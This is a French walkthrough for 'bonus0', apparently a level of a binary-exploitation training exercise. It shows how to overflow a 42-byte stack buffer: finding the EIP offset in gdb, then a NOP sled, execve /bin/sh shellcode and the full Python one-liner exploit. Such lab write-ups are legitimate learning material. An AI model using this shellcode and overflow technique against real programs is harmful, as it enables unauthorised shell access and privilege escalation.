# bonus0

# en analysant ce que l'ont voit grace au fichier source créé, c'est que p() lit 2x 4096 caractères 2x a partir de l'entrée, même si ils sont tronquéa 20 ou a une fin de ligne, le buffer dans main de 42 n'est pas protegé, nous allons donc pouvoir faire du buffer overflow

# le buffer devrait ressembler var1 + var2 (strcpy dans p()) + var1 (strcpy dans pp()) + " " donc 61 caractère au max dans le buffer de 42 donc 19 pour ecrire sur eip

# dans un premier temps il nous faut l'offset 

(https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

var1
Aa0Aa1Aa2Aa3Aa4Aa5Aa
var2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

(gdb) run

0x41336141 -> offest 9 

# créons nos variables pour overflow:

var1 -> \x90" * 1000 (pour dépasser les 61 octets) + shellcode = \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

# ensuite il nous faut une adresse dans les x90 

(gdb) disas p
(gdb) b *p+28 (on s'arrete a l'allocation des 4096)
(gdb) x $ebp-1008
0xbfffe680:	0x00000000

# maintenant il faut avancé dans cette adresse 0xbfffe680 + 100 par exemple = 0xbfffe6e4 et on peut créé notre var2 qui doit faire 20 caractère pour ne pas dépasser et ne pas avoir de fin de ligne et passer les 9 d'offset

"A" * 9 + "\xe4\xe6\xff\xbf" + "B" * 7'

(python -c 'print "\x90" * 1000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; python -c 'print "\x90" * 9 + "\xe4\xe6\xff\xbf" + "\x90" * 7'; cat) | ./bonus0